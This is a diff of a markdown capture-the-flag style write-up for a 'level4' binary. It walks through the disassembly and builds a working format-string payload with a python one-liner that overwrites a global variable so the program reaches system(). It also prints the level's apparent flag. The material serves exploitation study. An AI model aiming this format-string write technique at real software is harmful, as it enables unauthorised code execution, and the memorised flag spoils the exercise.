@@ -1,5 +1,5 @@
 ## level4
-The `level4` is almost the same as `level3`, a very basic main that call a function called `n()` and returns
+The `level4` is almost the same as `level3`, a very basic main that calls a function called `n()` that also calls `p()` only for outputing what was entered as argument and then function `n()` compares the value inside *global variable 0x8049810 \<m>* to `0x1025544` and if they are not equal the function returns otherwise it executes: <br> `0x080484a0 <+73>:	call   0x8048360 <system@plt>` <br>and that's what we want.
 ```
 0x080484a7 <+0>:	push   ebp
 0x080484a8 <+1>:	mov    ebp,esp
@@ -21,7 +21,7 @@ AAAA b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff3
 ```
 A little bit harder but we could find it, checking the position we know our __address__ is being set on the stack at postion 12th so we get it done `%12\$n` and the address we have it from the disassembled code<br>
 `x0804848d <+54>:	mov    eax,ds:0x8049810`<br> Now we just need to build the *format string specifier*. <br>
-`(python -c "print('\x10\x98\x04\x08' + 'A' + '%16930111c' + '%12\$n')"; cat -) | ./level4` <br>
+`(python -c "print('\x10\x98\x04\x08' + 'A' + '%16930111c' + '%12\$n')";) | ./level4` <br>
 [...]<br>
 after some 16930111 space later<br>
 `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
